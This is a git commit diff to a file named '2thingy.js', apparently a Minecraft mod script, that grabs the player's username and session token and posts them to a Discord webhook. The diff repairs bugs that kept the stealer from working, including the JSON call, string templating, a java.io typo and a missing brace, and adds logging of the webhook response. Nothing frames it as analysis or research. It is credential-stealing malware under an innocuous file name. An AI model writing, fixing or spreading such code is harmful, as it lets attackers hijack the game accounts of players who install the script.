029b0b7023c31d7eb960c7ba8c9784f2cbaa8321
Topstrik <110308736+Topstrik@users.noreply.github.com>
2025-04-27 18:26:26 +0300

    Update 2thingy.js

--- 2thingy.js
+++ 2thingy.js
@@ -12,7 +12,7 @@ function getSessionInfo() {
       let sessionId = session.func_111286_b();
       sendToDiscord(username, sessionId);
   } catch(error) {
-
+      console.error(error);
   }
 }
 
@@ -26,8 +26,8 @@ function sendToDiscord(username, sessionId) {
           connection.setRequestProperty("Content-Type", "application/json");
           connection.setRequestProperty("User-Agent", "Mozilla/5.0");
 
-          let jsonMessage = JSON.Stringify({
-              content: '**Username:** ${username}\n**Session ID:** ${sessionId}'
+          let jsonMessage = JSON.stringify({
+              content: `**Username:** ${username}\n**Session ID:** ${sessionId}`
           });
 
           let output = new java.io.OutputStreamWriter(connection.getOutputStream());
@@ -35,11 +35,14 @@ function sendToDiscord(username, sessionId) {
           output.flush();
           output.close();
 
-
-        let response = new java.oi.BufferedReader(new java.io.InputStreamReader(connection.getInputStream()));
-        while (response.readLine() !== null);
-        response.close();
+          let response = new java.io.BufferedReader(new java.io.InputStreamReader(connection.getInputStream()));
+          let responseLine;
+          while ((responseLine = response.readLine()) !== null) {
+              console.log(responseLine);
+          }
+          response.close();
       } catch(error) {
-
+          console.error(error);
       }
-}).start();
+  }).start();
+}
